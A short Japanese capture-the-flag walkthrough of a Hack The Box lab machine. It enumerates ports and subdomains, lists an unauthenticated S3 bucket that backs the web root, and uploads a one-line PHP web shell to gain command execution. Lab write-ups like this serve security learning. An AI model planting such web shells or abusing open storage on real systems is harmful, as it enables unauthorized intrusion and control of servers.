# Tree

## 手順

nmap ポートスキャン

```bash
└──╼ $nmap -p- --min-rate 10000 10.129.23.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-31 00:43 JST
Nmap scan report for thetoppers.htb (10.129.23.134)
Host is up (0.29s latency).
Not shown: 65465 filtered tcp ports (no-response), 68 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 38.71 seconds
```

ウェブページに飛ぶとemailのドメインが表示されている

そのドメインを``/etc/hosts``にIPアドレスのペアを記載する

サブドメインを探す

``gobuster``

```bash
└──╼ $gobuster vhost --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://thetoppers.htb
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: s3.thetoppers.htb Status: 404 [Size: 21]
```

wfuzzやffufというツールでもサブドメインを探すファジングができる

見つけたサブドメイン``s3.thetoppers.htb``とIPアドレスのペアを``/etc/hosts``に追加する

ドメインの先頭がs3であることからamazon s3を使っていることがわかる

amazon s3にフォルダがおいてあるのでaws cliを使ってフォルダを表示してみる

その前にaws configureを実行する

```bash
└──╼ $aws configure
AWS Access Key ID [None]: temp
AWS Secret Access Key [None]: temp
Default region name [None]: temp
Default output format [None]: temp
```

s3内のフォルダリスト表示 多分ルート？

```bash
└──╼ $aws --endpoint=http://<ドメイン名> s3 ls
2024-07-31 00:30:50 thetoppers.htb
```

thetoppers.htbフォルダの中のリスト表示

```bash
└──╼ $aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2024-07-31 00:30:50          0 .htaccess
2024-07-31 00:30:50      11952 index.php
```

上記がWebページに表示しているフォルダが入っていることがわかる

OSコマンドを実行できるようなphpファイルを用意し、s3にアップロードする

```bash
└──╼ $echo '<?php system($_GET["cmd"]); ?>' > shell.php

└──╼ $aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php     
```

これで自由にコマンドを使うことができるようになった